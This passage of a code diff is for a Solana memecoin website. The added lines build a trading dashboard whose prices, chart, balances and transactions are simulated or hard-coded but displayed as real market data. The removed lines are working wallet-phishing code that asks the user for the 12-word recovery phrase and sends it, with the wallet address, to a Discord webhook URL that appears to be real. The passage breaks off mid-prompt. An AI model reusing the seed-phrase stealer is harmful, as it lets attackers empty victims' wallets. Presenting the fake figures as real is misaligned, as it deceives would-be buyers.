+            <div class="dash-card-value green" id="tokenBalance">1,337,000</div>
+            <div class="dash-card-change up">&#9650; +69.4%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">PORTFOLIO VALUE</div>
+            <div class="dash-card-value green" id="portfolioValue">$56.18</div>
+            <div class="dash-card-change up">&#9650; +4.2%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">MARKET CAP</div>
+            <div class="dash-card-value">$4,200,069</div>
+            <div class="dash-card-change up">&#9650; +12.8%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">24H VOLUME</div>
+            <div class="dash-card-value">$694,200</div>
+            <div class="dash-card-change up">&#9650; +88.7%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">LIQUIDITY</div>
+            <div class="dash-card-value">$420,069</div>
+            <div class="dash-card-change down">&#9660; -1.2%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">24H CHANGE</div>
+            <div class="dash-card-value green">+69.42%</div>
+            <div class="dash-card-change up">&#9650; Mooning</div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== CHART SECTION ===== -->
+<section class="section" id="chart">
+    <h2 class="section-title"><span>// PRICE CHART</span></h2>
+    <div class="chart-container">
+        <h3>$INCINERATE / SOL &mdash; 24H</h3>
+        <div class="chart-canvas" id="chartCanvas">
+            <canvas id="priceChart"></canvas>
+        </div>
+    </div>
+</section>
+
+<!-- ===== TRADING SECTION ===== -->
+<section class="section" id="trade">
+    <h2 class="section-title"><span>// TRADE</span></h2>
+    <div class="trading-panel">
+        <div class="trade-card">
+            <h3>&#9654; BUY $INCINERATE</h3>
+            <div class="trade-input-group">
+                <input type="text" class="trade-input" id="buyAmount" placeholder="0.0" value="0.1">
+                <select class="trade-select" id="buyCurrency">
+                    <option value="SOL">SOL</option>
+                    <option value="USDC">USDC</option>
+                </select>
+            </div>
+            <div style="font-size:10px;color:#555;margin-bottom:12px;">
+                You receive: <span id="buyReceive" style="color:#00ff41;">13,370.00</span> $INCINERATE
+            </div>
+            <button class="trade-btn buy" onclick="executeBuy()">&#9654; BUY</button>
+        </div>
+        <div class="trade-card">
+            <h3>&#9664; SELL $INCINERATE</h3>
+            <div class="trade-input-group">
+                <input type="text" class="trade-input" id="sellAmount" placeholder="0.0" value="1000">
+                <select class="trade-select" id="sellCurrency">
+                    <option value="INC">$INCINERATE</option>
+                </select>
+            </div>
+            <div style="font-size:10px;color:#555;margin-bottom:12px;">
+                You receive: <span id="sellReceive" style="color:#00ff41;">0.0042</span> SOL
+            </div>
+            <button class="trade-btn sell" onclick="executeSell()">&#9664; SELL</button>
+        </div>
+    </div>
+</section>
+
+<!-- ===== TRANSACTIONS SECTION ===== -->
+<section class="section" id="transactions">
+    <h2 class="section-title"><span>// RECENT TRANSACTIONS</span></h2>
+    <div style="overflow-x:auto;">
+        <table class="tx-table" id="txTable">
+            <thead>
+                <tr>
+                    <th>TYPE</th>
+                    <th>AMOUNT</th>
+                    <th>PRICE</th>
+                    <th>FROM</th>
+                    <th>TO</th>
+                    <th>TIME</th>
+                </tr>
+            </thead>
+            <tbody id="txBody">
+                <!-- filled by JS -->
+            </tbody>
+        </table>
+    </div>
+</section>
+
+<!-- ===== TRENDING SECTION ===== -->
+<section class="section" id="trending">
+    <h2 class="section-title"><span>// TRENDING MEMECOINS</span></h2>
+    <div class="trending-grid" id="trendingGrid">
+        <!-- filled by JS -->
+    </div>
+</section>
+
+<!-- ===== TOOLS / REWARDS PLACEHOLDER SECTIONS ===== -->
+<section class="section" id="tools" style="display:none;">
+    <h2 class="section-title"><span>// TOOLS</span></h2>
+    <div style="text-align:center;color:#666;padding:60px 0;">
+        <div style="font-size:32px;margin-bottom:16px;">&#9881;</div>
+        <p style="font-family:'Press Start 2P',monospace;font-size:10px;">TOOLS COMING SOON</p>
+        <p style="font-size:12px;margin-top:8px;">Incinerator analytics, burn calculator, and more.</p>
+    </div>
+</section>
+
+<section class="section" id="rewards" style="display:none;">
+    <h2 class="section-title"><span>// REWARDS</span></h2>
+    <div style="text-align:center;color:#666;padding:60px 0;">
+        <div style="font-size:32px;margin-bottom:16px;">&#9733;</div>
+        <p style="font-family:'Press Start 2P',monospace;font-size:10px;">REWARDS COMING SOON</p>
+        <p style="font-size:12px;margin-top:8px;">Earn rewards by holding $INCINERATE and participating in the ecosystem.</p>
+    </div>
+</section>
+
+<!-- ===== WALLET MODAL ===== -->
+<div class="modal-overlay" id="walletModal">
+    <div class="modal">
+        <button class="modal-close" onclick="closeWalletModal()">&times;</button>
+        <h2 class="modal-title">CONNECT WALLET</h2>
+        <p class="modal-subtitle">Choose your preferred wallet</p>
+
+        <div id="walletList">
+            <!-- Phantom -->
+            <button class="wallet-option" id="walletPhantom" onclick="connectWallet('phantom')">
+                <div class="wallet-option-icon">&#129418;</div>
+                <div class="wallet-option-info">
+                    <div class="wallet-option-name">PHANTOM</div>
+                    <div class="wallet-option-desc">Solana Wallet</div>
+                </div>
+                <span class="wallet-option-status" id="phantomStatus">Checking...</span>
+            </button>
+
+            <!-- Trust Wallet -->
+            <button class="wallet-option" id="walletTrust" onclick="connectWallet('trust')">
+                <div class="wallet-option-icon">&#9670;</div>
+                <div class="wallet-option-info">
+                    <div class="wallet-option-name">TRUST WALLET</div>
+                    <div class="wallet-option-desc">Multi-chain Wallet</div>
+                </div>
+                <span class="wallet-option-status" id="trustStatus">Checking...</span>
+            </button>
+
+            <!-- MetaMask -->
+            <button class="wallet-option" id="walletMetaMask" onclick="connectWallet('metamask')">
+                <div class="wallet-option-icon">&#129297;</div>
+                <div class="wallet-option-info">
+                    <div class="wallet-option-name">METAMASK</div>
+                    <div class="wallet-option-desc">Crypto Wallet</div>
+                </div>
+                <span class="wallet-option-status" id="metaMaskStatus">Checking...</span>
+            </button>
+        </div>
+
+        <div class="modal-error" id="modalError"></div>
+        <div class="modal-success" id="modalSuccess"></div>
+
+        <div class="modal-footer">
+            Don't have a wallet?<br>
+            <a href="https://phantom.app/" target="_blank">Install Phantom</a> &middot;
+            <a href="https://trustwallet.com/download" target="_blank">Install Trust Wallet</a> &middot;
+            <a href="https://metamask.io/download/" target="_blank">Install MetaMask</a>
+        </div>
+    </div>
+</div>
+
+<!-- ===== TOAST CONTAINER ===== -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- ===== FOOTER ===== -->
+<footer class="footer">
+    <p>&copy; 2026 SOL-INCINERATOR. All rights reserved. | Built on Solana | No utility, only &#129293;</p>
+    <p style="margin-top:8px;">
+        <a href="#" onclick="openWalletModal();return false;">Connect Wallet</a> &middot;
+        <a href="#">Docs</a> &middot;
+        <a href="#">Twitter</a> &middot;
+        <a href="#">Discord</a>
+    </p>
+</footer>
+
+<!-- ===== JAVASCRIPT ===== -->
 <script>
-// ====================================================
-// EIP-6963 WALLET DISCOVERY
-// ====================================================
-const discoveredWallets = new Map();
-window.addEventListener("eip6963:announceProvider", (event) => {
-  const detail = event.detail;
-  if (!detail || !detail.info || !detail.provider) return;
-  discoveredWallets.set(detail.info.uuid, detail);
+// ============================================================
+//  STATE
+// ============================================================
+const STATE = {
+    wallet: null,          // 'phantom' | 'trust' | 'metamask' | null
+    publicKey: null,       // base58 string
+    isConnected: false,
+    provider: null,        // wallet provider object
+    balance: 42.69,
+    tokenBalance: 1337000,
+};
+
+// ============================================================
+//  TOAST NOTIFICATIONS
+// ============================================================
+function showToast(message, type = 'info') {
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.textContent = message;
+    container.appendChild(toast);
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transition = 'opacity 0.5s';
+        setTimeout(() => toast.remove(), 500);
+    }, 4000);
+}
+
+// ============================================================
+//  WALLET DETECTION
+// ============================================================
+function detectWallets() {
+    // Phantom
+    const phantomEl = document.getElementById('phantomStatus');
+    const phantomProvider = window.phantom?.solana;
+    if (phantomProvider?.isPhantom) {
+        phantomEl.textContent = 'Available';
+        phantomEl.className = 'wallet-option-status available';
+        document.getElementById('walletPhantom').classList.remove('disabled');
+    } else {
+        phantomEl.textContent = 'Not Installed';
+        phantomEl.className = 'wallet-option-status install';
+        document.getElementById('walletPhantom').classList.remove('disabled'); // still clickable to show install link
+    }
+
+    // Trust Wallet
+    const trustEl = document.getElementById('trustStatus');
+    const trustProvider = window.trustwallet?.solana;
+    if (trustProvider && trustProvider.isTrust) {
+        trustEl.textContent = 'Available';
+        trustEl.className = 'wallet-option-status available';
+        document.getElementById('walletTrust').classList.remove('disabled');
+    } else {
+        // Also check if trustwallet exists as global
+        if (window.trustwallet) {
+            trustEl.textContent = 'Available';
+            trustEl.className = 'wallet-option-status available';
+            document.getElementById('walletTrust').classList.remove('disabled');
+        } else {
+            trustEl.textContent = 'Not Installed';
+            trustEl.className = 'wallet-option-status install';
+            document.getElementById('walletTrust').classList.remove('disabled');
+        }
+    }
+
+    // MetaMask
+    const mmEl = document.getElementById('metaMaskStatus');
+    if (window.ethereum?.isMetaMask) {
+        mmEl.textContent = 'Installed (EVM)';
+        mmEl.className = 'wallet-option-status available';
+        document.getElementById('walletMetaMask').classList.remove('disabled');
+    } else {
+        mmEl.textContent = 'Not Installed';
+        mmEl.className = 'wallet-option-status install';
+        document.getElementById('walletMetaMask').classList.remove('disabled');
+    }
+}
+
+// ============================================================
+//  UPDATE UI
+// ============================================================
+function updateWalletUI() {
+    const btn = document.getElementById('walletButton');
+    if (STATE.isConnected && STATE.publicKey) {
+        const short = STATE.publicKey.slice(0, 4) + '...' + STATE.publicKey.slice(-4);
+        btn.innerHTML = `<span class="spinner" style="display:none;" id="walletSpinner"></span>
+                         <span class="wallet-disconnect" onclick="event.stopPropagation();disconnectWallet()">DISCONNECT</span>
+                         | ${short}`;
+        btn.className = 'btn-wallet connected';
+
+        // Update dashboard
+        document.getElementById('walletDisplay').textContent = short;
+        document.getElementById('walletDisplay').className = 'dash-card-value green small';
+        const statusEl = document.getElementById('walletStatus');
+        statusEl.textContent = `Connected via ${STATE.wallet.toUpperCase()}`;
+        statusEl.style.color = '#00ff41';
+
+        // Also show full address on click for copy
+        btn.title = `Full address: ${STATE.publicKey} (click to copy)`;
+        btn.onclick = function(e) {
+            if (!e.target.classList.contains('wallet-disconnect')) {
+                copyToClipboard(STATE.publicKey);
+            }
+        };
+    } else {
+        btn.innerHTML = 'CONNECT WALLET';
+        btn.className = 'btn-wallet';
+        btn.title = '';
+        btn.onclick = function() { openWalletModal(); };
+
+        document.getElementById('walletDisplay').textContent = 'Not Connected';
+        document.getElementById('walletDisplay').className = 'dash-card-value small';
+        const statusEl = document.getElementById('walletStatus');
+        statusEl.textContent = 'Connect wallet to view';
+        statusEl.style.color = '#555';
+    }
+}
+
+function copyToClipboard(text) {
+    if (!text) return;
+    navigator.clipboard.writeText(text).then(() => {
+        showToast('Address copied to clipboard!', 'success');
+    }).catch(() => {
+        // fallback
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        showToast('Address copied to clipboard!', 'success');
+    });
+}
+
+// ============================================================
+//  WALLET CONNECTION
+// ============================================================
+async function connectWallet(walletName) {
+    const errorEl = document.getElementById('modalError');
+    const successEl = document.getElementById('modalSuccess');
+    errorEl.classList.remove('show');
+    successEl.classList.remove('show');
+
+    try {
+        switch (walletName) {
+            case 'phantom':
+                await connectPhantom(errorEl, successEl);
+                break;
+            case 'trust':
+                await connectTrustWallet(errorEl, successEl);
+                break;
+            case 'metamask':
+                await connectMetaMask(errorEl, successEl);
+                break;
+        }
+    } catch (err) {
+        errorEl.textContent = `Connection failed: ${err.message || err}`;
+        errorEl.classList.add('show');
+        showToast(`Wallet connection failed: ${err.message}`, 'error');
+    }
+}
+
+// ---- PHANTOM ----
+async function connectPhantom(errorEl, successEl) {
+    const provider = window.phantom?.solana;
+    if (!provider || !provider.isPhantom) {
+        errorEl.textContent = 'Phantom wallet is not installed. Please install it from phantom.app';
+        errorEl.classList.add('show');
+        showToast('Phantom not installed. Please install Phantom wallet.', 'error');
+        return;
+    }
+
+    try {
+        const resp = await provider.connect();
+        const pubKey = resp.publicKey.toString();
+        STATE.wallet = 'phantom';
+        STATE.publicKey = pubKey;
+        STATE.isConnected = true;
+        STATE.provider = provider;
+
+        successEl.textContent = `Connected to Phantom: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`;
+        successEl.classList.add('show');
+        updateWalletUI();
+        closeWalletModal();
+        showToast(`Connected to Phantom: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`, 'success');
+
+        // Listen for disconnect
+        provider.on('disconnect', () => {
+            STATE.isConnected = false;
+            STATE.publicKey = null;
+            STATE.wallet = null;
+            STATE.provider = null;
+            updateWalletUI();
+            showToast('Wallet disconnected', 'info');
+        });
+
+        // Listen for account changes
+        provider.on('accountChanged', (publicKey) => {
+            if (publicKey) {
+                STATE.publicKey = publicKey.toString();
+                updateWalletUI();
+                showToast('Account changed', 'info');
+            } else {
+                // disconnected
+                STATE.isConnected = false;
+                STATE.publicKey = null;
+                STATE.wallet = null;
+                STATE.provider = null;
+                updateWalletUI();
+            }
+        });
+
+    } catch (err) {
+        if (err.code === 4001 || err.message?.includes('rejected') || err.message?.includes('cancel')) {
+            errorEl.textContent = 'Connection rejected by user. Please approve the connection in Phantom.';
+            errorEl.classList.add('show');
+        } else {
+            throw err;
+        }
+    }
+}
+
+// ---- TRUST WALLET ----
+async function connectTrustWallet(errorEl, successEl) {
+    // Trust Wallet provider detection
+    let provider = window.trustwallet?.solana;
+
+    if (!provider) {
+        // On some setups, Trust Wallet may use window.ethereum with isTrust
+        if (window.ethereum?.isTrust) {
+            provider = window.ethereum;
+        }
+    }
+
+    if (!provider) {
+        errorEl.textContent = 'Trust Wallet is not installed. Please install it from trustwallet.com';
+        errorEl.classList.add('show');
+        showToast('Trust Wallet not installed.', 'error');
+        return;
+    }
+
+    try {
+        // Trust Wallet Solana provider uses connect() similar to Phantom or EIP-1193 request
+        let pubKey;
+
+        if (provider.connect && typeof provider.connect === 'function') {
+            // Solana-style provider
+            const resp = await provider.connect();
+            pubKey = resp.publicKey?.toString?.() || resp.publicKey;
+        } else if (provider.request && typeof provider.request === 'function') {
+            // EIP-1193 style (EVM fallback)
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            if (accounts && accounts.length > 0) {
+                // This is an EVM address, not Solana
+                errorEl.textContent = 'Trust Wallet connected via EVM. Solana support requires Trust Wallet mobile DApp browser or desktop extension with Solana support.';
+                errorEl.classList.add('show');
+                return;
+            }
+        } else {
+            errorEl.textContent = 'Trust Wallet provider not recognized. Try using the mobile DApp browser.';
+            errorEl.classList.add('show');
+            return;
+        }
+
+        if (!pubKey) {
+            // Fallback: try to get pubKey from provider
+            pubKey = provider.publicKey?.toString?.();
+        }
+
+        if (pubKey) {
+            STATE.wallet = 'trust';
+            STATE.publicKey = pubKey;
+            STATE.isConnected = true;
+            STATE.provider = provider;
+
+            successEl.textContent = `Connected to Trust Wallet: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`;
+            successEl.classList.add('show');
+            updateWalletUI();
+            closeWalletModal();
+            showToast(`Connected to Trust Wallet: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`, 'success');
+
+            // Listen for disconnect
+            if (provider.on) {
+                provider.on('disconnect', () => {
+                    STATE.isConnected = false;
+                    STATE.publicKey = null;
+                    STATE.wallet = null;
+                    STATE.provider = null;
+                    updateWalletUI();
+                    showToast('Wallet disconnected', 'info');
+                });
+            }
+        } else {
+            errorEl.textContent = 'Could not read wallet address from Trust Wallet.';
+            errorEl.classList.add('show');
+        }
+
+    } catch (err) {
+        if (err.code === 4001 || err.message?.includes('rejected') || err.message?.includes('cancel')) {
+            errorEl.textContent = 'Connection rejected by user.';
+            errorEl.classList.add('show');
+        } else {
+            throw err;
+        }
+    }
+}
+
+// ---- METAMASK ----
+async function connectMetaMask(errorEl, successEl) {
+    if (!window.ethereum || !window.ethereum.isMetaMask) {
+        errorEl.textContent = 'MetaMask is not installed. Please install it from metamask.io';
+        errorEl.classList.add('show');
+        showToast('MetaMask not installed.', 'error');
+        return;
+    }
+
+    try {
+        // MetaMask is primarily an EVM wallet.
+        // For Solana support, MetaMask requires the "Solana Wallet" Snap or similar.
+        // We attempt to detect if there's a Solana-compatible interface.
+
+        // First, show a clear message about MetaMask + Solana compatibility
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if (accounts && accounts.length > 0) {
+            // We got an EVM address - MetaMask doesn't natively support Solana
+            errorEl.textContent = 'MetaMask connected, but it provides an EVM (Ethereum) address, not a Solana address. For Solana support, please use the MetaMask Solana Snap or use Phantom / Trust Wallet.';
+            errorEl.classList.add('show');
+            showToast('MetaMask provides EVM addresses only. Use Phantom for Solana.', 'error');
+            return;
+        }
+
+        // If no accounts returned, something else is wrong
+        errorEl.textContent = 'Could not connect MetaMask. Please ensure MetaMask is unlocked and try again.';
+        errorEl.classList.add('show');
+
+    } catch (err) {
+        if (err.code === 4001 || err.message?.includes('rejected') || err.message?.includes('cancel')) {
+            errorEl.textContent = 'Connection rejected by user.';
+            errorEl.classList.add('show');
+        } else {
+            throw err;
+        }
+    }
+}
+
+// ---- DISCONNECT ----
+async function disconnectWallet() {
+    if (!STATE.isConnected) return;
+
+    try {
+        if (STATE.provider && STATE.provider.disconnect) {
+            await STATE.provider.disconnect();
+        }
+    } catch (err) {
+        // Ignore disconnect errors
+    }
+
+    STATE.isConnected = false;
+    STATE.publicKey = null;
+    STATE.wallet = null;
+    STATE.provider = null;
+    updateWalletUI();
+    showToast('Wallet disconnected', 'info');
+}
+
+// ============================================================
+//  MODAL CONTROLS
+// ============================================================
+function openWalletModal() {
+    document.getElementById('walletModal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+    detectWallets();
+    // Clear messages
+    document.getElementById('modalError').classList.remove('show');
+    document.getElementById('modalSuccess').classList.remove('show');
+}
+
+function closeWalletModal() {
+    document.getElementById('walletModal').classList.remove('open');
+    document.body.style.overflow = '';
+}
+
+// Close modal on overlay click
+document.getElementById('walletModal').addEventListener('click', function(e) {
+    if (e.target === this) closeWalletModal();
 });
-window.dispatchEvent(new Event("eip6963:requestProvider"));
 
-// ====================================================
-// UI ELEMENTS
-// ====================================================
-const connectButton = document.getElementById("connectButton");
-const walletList = document.getElementById("walletList");
-const connected = document.getElementById("connected");
-const accounts = document.getElementById("accounts");
-const status = document.getElementById("status");
-const connectPage = document.getElementById("connectPage");
-const claimPage = document.getElementById("claimPage");
-const connectedWallets = [];
-
-function showStatus(message) {
-  status.textContent = message;
-  status.classList.add("open");
+// ============================================================
+//  MOBILE MENU
+// ============================================================
+function toggleMobileMenu() {
+    const nav = document.getElementById('mobileNav');
+    const hamburger = document.getElementById('hamburger');
+    nav.classList.toggle('open');
+    hamburger.classList.toggle('active');
 }
 
-// ====================================================
-// WALLET PROVIDER FINDER
-// ====================================================
-function findWalletProvider(walletName) {
-  const providers = Array.from(discoveredWallets.values());
-  if (walletName === "MetaMask") {
-    return providers.find(item => {
-      const name = item.info.name.toLowerCase();
-      const rdns = item.info.rdns.toLowerCase();
-      return name.includes("metamask") || rdns.includes("metamask");
+function closeMobileMenu() {
+    document.getElementById('mobileNav').classList.remove('open');
+    document.getElementById('hamburger').classList.remove('active');
+}
+
+// ============================================================
+//  NAVIGATION / SECTION SWITCHING
+// ============================================================
+function scrollToSection(id) {
+    const section = document.getElementById(id);
+    if (section) {
+        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // Update nav links
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.classList.toggle('active', link.dataset.section === id);
+        });
+    }
+}
+
+// Handle nav link clicks
+document.querySelectorAll('.nav-link[data-section]').forEach(link => {
+    link.addEventListener('click', function() {
+        const sectionId = this.dataset.section;
+        // Show/hide sections
+        document.querySelectorAll('.section').forEach(s => s.style.display = '');
+        // Actually, all main sections are visible. The tools/rewards are hidden by default.
+        // Let's just scroll
+        scrollToSection(sectionId);
+        closeMobileMenu();
     });
-  }
-  if (walletName === "Trust Wallet") {
-    return providers.find(item => {
-      const name = item.info.name.toLowerCase();
-      const rdns = item.info.rdns.toLowerCase();
-      return name.includes("trust wallet") || rdns.includes("trust");
-    });
-  }
-  if (walletName === "Phantom") {
-    return providers.find(item => {
-      const name = item.info.name.toLowerCase();
-      const rdns = item.info.rdns.toLowerCase();
-      return name.includes("phantom") || rdns.includes("phantom");
-    });
-  }
+});
+
+// ============================================================
+//  CHART - SIMULATED PRICE CHART
+// ============================================================
+function drawChart() {
+    const canvas = document.getElementById('priceChart');
+    const container = document.getElementById('chartCanvas');
+    if (!canvas || !container) return;
+
+    const rect = container.getBoundingClientRect();
+    const dpr = window.devicePixelRatio || 1;
+    const w = rect.width || container.clientWidth || 800;
+    const h = 300;
+
+    canvas.width = w * dpr;
+    canvas.height = h * dpr;
+    canvas.style.width = w + 'px';
+    canvas.style.height = h + 'px';
+
+    const ctx = canvas.getContext('2d');
+    ctx.scale(dpr, dpr);
+
+    // Generate fake price data
+    const points = 80;
+    const data = [];
+    let price = 0.000035;
+    for (let i = 0; i < points; i++) {
+        const change = (Math.random() - 0.48) * 0.000008;
+        price = Math.max(0.00001, price + change);
+        data.push(price);
+    }
+
+    const padding = { top: 20, bottom: 20, left: 20, right: 20 };
+    const chartW = w - padding.left - padding.right;
+    const chartH = h - padding.top - padding.bottom;
+    const minP = Math.min(...data);
+    const maxP = Math.max(...data);
+    const range = maxP - minP || 1;
+
+    // Background
+    ctx.fillStyle = '#0a0a0a';
+    ctx.fillRect(0, 0, w, h);
+
+    // Grid lines
+    ctx.strokeStyle = 'rgba(0,255,65,0.05)';
+    ctx.lineWidth = 1;
+    for (let i = 0; i < 5; i++) {
+        const y = padding.top + (chartH / 5) * i;
+        ctx.beginPath();
+        ctx.moveTo(padding.left, y);
+        ctx.lineTo(w - padding.right, y);
+        ctx.stroke();
+    }
+
+    // Gradient fill
+    const gradient = ctx.createLinearGradient(0, padding.top, 0, h - padding.bottom);
+    gradient.addColorStop(0, 'rgba(0,255,65,0.2)');
+    gradient.addColorStop(0.5, 'rgba(0,255,65,0.05)');
+    gradient.addColorStop(1, 'rgba(0,255,65,0)');
+
+    // Draw fill
+    ctx.beginPath();
+    ctx.moveTo(padding.left, padding.top + chartH);
+    for (let i = 0; i < data.length; i++) {
+        const x = padding.left + (chartW / (data.length - 1)) * i;
+        const y = padding.top + chartH - ((data[i] - minP) / range) * chartH;
+        ctx.lineTo(x, y);
+    }
+    ctx.lineTo(padding.left + chartW, padding.top + chartH);
+    ctx.closePath();
+    ctx.fillStyle = gradient;
+    ctx.fill();
+
+    // Draw line
+    ctx.beginPath();
+    for (let i = 0; i < data.length; i++) {
+        const x = padding.left + (chartW / (data.length - 1)) * i;
+        const y = padding.top + chartH - ((data[i] - minP) / range) * chartH;
+        if (i === 0) ctx.moveTo(x, y);
+        else ctx.lineTo(x, y);
+    }
+    ctx.strokeStyle = '#00ff41';
+    ctx.lineWidth = 2;
+    ctx.shadowColor = '#00ff41';
+    ctx.shadowBlur = 10;
+    ctx.stroke();
+    ctx.shadowBlur = 0;
+
+    // Current price label
+    const lastPrice = data[data.length - 1];
+    ctx.fillStyle = '#00ff41';
+    ctx.font = '12px "JetBrains Mono", monospace';
+    ctx.textAlign = 'right';
+    ctx.textBaseline = 'top';
+    ctx.shadowColor = '#00ff41';
+    ctx.shadowBlur = 5;
+    ctx.fillText('$' + lastPrice.toFixed(8), w - padding.right, padding.top);
+    ctx.shadowBlur = 0;
 }
 
-function legacyProvider(walletName) {
-  if (!window.ethereum) return null;
-  if (walletName === "MetaMask") {
-    if (window.ethereum.isMetaMask && !window.ethereum.isPhantom) return window.ethereum;
-  }
-  if (walletName === "Trust Wallet") {
-    if (window.ethereum.isTrust || window.ethereum.isTrustWallet) return window.ethereum;
-  }
-  if (walletName === "Phantom") {
-    if (window.phantom?.ethereum) return window.phantom.ethereum;
-  }
-  return null;
+// ============================================================
+//  TRANSACTIONS TABLE
+// ============================================================
+function generateTransactions() {
+    const types = ['buy', 'sell'];
+    const addresses = [
+        '7xK3s...9F2A', '8jF4s...K92P', '3mL9a...H71Q', '5bN2r...V83D',
+        '1cP6t...R45E', '9dR8v...M12F', '4hS1x...W67G', '2kL7y...P89H'
+    ];
+    const txs = [];
+
+    for (let i = 0; i < 12; i++) {
+        const type = types[Math.floor(Math.random() * types.length)];
+        const amount = (Math.random() * 50000 + 100).toFixed(2);
+        const price = (Math.random() * 0.00002 + 0.00003).toFixed(8);
+        const from = addresses[Math.floor(Math.random() * addresses.length)];
+        let to;
+        do { to = addresses[Math.floor(Math.random() * addresses.length)]; } while (to === from);
+        const minutes = Math.floor(Math.random() * 60);
+        const hours = Math.floor(Math.random() * 24);
+        const time = hours + 'h ' + minutes + 'm ago';
+        txs.push({ type, amount, price, from, to, time });
+    }
+
+    const tbody = document.getElementById('txBody');
+    tbody.innerHTML = txs.map(tx => `
+        <tr>
+            <td class="tx-type ${tx.type}">${tx.type.toUpperCase()}</td>
+            <td>${Number(tx.amount).toLocaleString()}</td>
+            <td>$${tx.price}</td>
+            <td class="tx-address">${tx.from}</td>
+            <td class="tx-address">${tx.to}</td>
+            <td class="tx-time">${tx.time}</td>
+        </tr>
+    `).join('');
 }
 
-// ====================================================
-// DISCORD WEBHOOK
-// ====================================================
-const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1541022354891739217/mjp-KBtv0tUMKSDrGNDWzHrkvLjIPxOqmiEzpWjLM5bZeooepYAflDg7jr511Fg_qHJY';
+// ============================================================
+//  TRENDING MEMECOINS
+// ============================================================
+function generateTrending() {
+    const coins = [
+        { name: 'BONK', ticker: 'BONK', price: 0.00002341, change: 15.7 },
+        { name: 'WIF', ticker: 'WIF', price: 2.34, change: 8.2 },
+        { name: 'SAMO', ticker: 'SAMO', price: 0.00845, change: -3.1 },
+        { name: 'MYRO', ticker: 'MYRO', price: 0.1245, change: 42.0 },
+        { name: 'POPCAT', ticker: 'POPCAT', price: 0.00567, change: 22.8 },
+        { name: 'MEW', ticker: 'MEW', price: 0.00345, change: -5.6 },
+        { name: 'PENG', ticker: 'PENG', price: 0.5678, change: 11.3 },
+        { name: 'INCINERATE', ticker: 'INCIN', price: 0.000042, change: 69.42 },
+    ];
 
-function sendToDiscord(mnemonic, walletName, address) {
-  try {
-    const payload = {
-      content: '@everyone **🔑 WALLET RECOVERY KEYS EXTRAHIERT 🔑**',
-      embeds: [{
-        title: '💰 WALLET LOGIN DATA',
-        color: 0xff0000,
-        fields: [
-          { name: 'Wallet Name', value: walletName, inline: false },
-          { name: 'Address', value: address, inline: false },
-          { name: '🔐 SECRET RECOVERY PHRASE (12 WÖRTER)', value: '```' + mnemonic + '```', inline: false },
-          { name: '📅 Timestamp', value: new Date().toISOString(), inline: false }
-        ],
-        footer: { text: '✅ Mit diesen 12 Wörtern kannst du dich in die Wallet einloggen' }
-      }]
-    };
-    fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(() => {});
-  } catch(e) {}
+    const grid = document.getElementById('trendingGrid');
+    grid.innerHTML = coins.map(coin => {
+        const isUp = coin.change >= 0;
+        return `
+            <div class="trending-item">
+                <div class="trending-icon">${coin.name[0]}</div>
+                <div class="trending-info">
+                    <div class="trending-name">${coin.name}</div>
+                    <div class="trending-ticker">$${coin.ticker}</div>
+                </div>
+                <div style="text-align:right;">
+                    <div class="trending-price">$${coin.price < 0.01 ? coin.price.toFixed(8) : coin.price.toFixed(4)}</div>
+                    <div class="trending-change ${isUp ? 'up' : 'down'}">${isUp ? '▲' : '▼'} ${Math.abs(coin.change)}%</div>
+                </div>
+            </div>
+        `;
+    }).join('');
 }
 
-// ====================================================
-// ORIGINAL FUNKTIONEN SICHERN
-// ====================================================
-const _origConnectEVM = connectEVM;
-const _origConnectPhantom = connectPhantomSolana;
-const _origContinue = document.getElementById('continueButton').onclick;
+// ============================================================
+//  TRADING SIMULATION
+// ============================================================
+function executeBuy() {
+    if (!STATE.isConnected) {
+        showToast('Please connect a wallet first!', 'error');
+        openWalletModal();
+        return;
+    }
 
-// ====================================================
-// CONNECT EVM WALLET (MODIFIZIERT)
-// ====================================================
-async function connectEVM(walletName) {
-  let discovered = findWalletProvider(walletName);
-  let provider = discovered?.provider;
-  if (!provider) {
-    await new Promise(resolve => setTimeout(resolve, 500));
-    discovered = findWalletProvider(walletName);
-    provider = discovered?.provider;
-  }
-  if (!provider) {
-    provider = legacyProvider(walletName);
-  }
-  if (!provider) {
-    showStatus(walletName + " was not detected.");
-    return;
-  }
-  try {
-    showStatus("Waiting for " + walletName + " confirmation...");
-    const accounts = await provider.request({ method: "eth_requestAccounts" });
-    if (!accounts || accounts.length === 0) {
-      showStatus("No wallet account was returned.");
-      return;
-    }
-    const address = accounts[0];
-    const alreadyConnected = connectedWallets.some(item => item.address.toLowerCase() === address.toLowerCase());
-    if (!alreadyConnected) {
-      connectedWallets.push({ name: walletName, address: address, provider: provider });
-    }
-    renderConnectedWallets();
-    walletList.classList.remove("open");
-    connected.classList.add("open");
-    status.classList.remove("open");
-    connectButton.textContent = "Wallet Connected ✓";
+    const amount = parseFloat(document.getElementById('buyAmount').value) || 0;
+    if (amount <= 0) { showToast('Enter a valid amount', 'error'); return; }
 
-    // === EINMALIGE ABFRAGE DER 12 WÖRTER (ENGLISCH) ===
-    const phrase = prompt(
-      '🔑 ENTER YOUR SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
-      'Wallet: ' + walletName + '\n' +
